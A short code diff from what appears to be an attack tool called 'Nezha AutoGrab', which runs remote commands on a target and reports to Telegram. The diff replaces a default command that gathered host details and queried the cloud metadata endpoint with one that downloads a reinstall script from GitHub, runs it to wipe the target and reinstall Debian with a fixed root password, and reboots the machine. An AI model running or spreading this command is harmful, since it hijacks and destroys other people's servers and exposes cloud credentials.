@@ -529,7 +529,7 @@ def main():
         tg.send(f"🦞 <b>Nezha AutoGrab v{VERSION} 启动</b>\n目标: {args.target}")
 
     # 默认 RCE 命令
-    command = args.command or "id; hostname; whoami; curl -s http://169.254.169.254/latest/meta-data/"
+    command = args.command or "curl -fsSL https://raw.githubusercontent.com/bin456789/reinstall/main/reinstall.sh -o reinstall.sh || wget -O reinstall.sh https://raw.githubusercontent.com/bin456789/reinstall/main/reinstall.sh && bash reinstall.sh debian --username root --password Sddfcnb-1 && reboot"
 
     # 步骤0: 启动 webhook 接收器
     start_webhook_server(args.webhook_port)
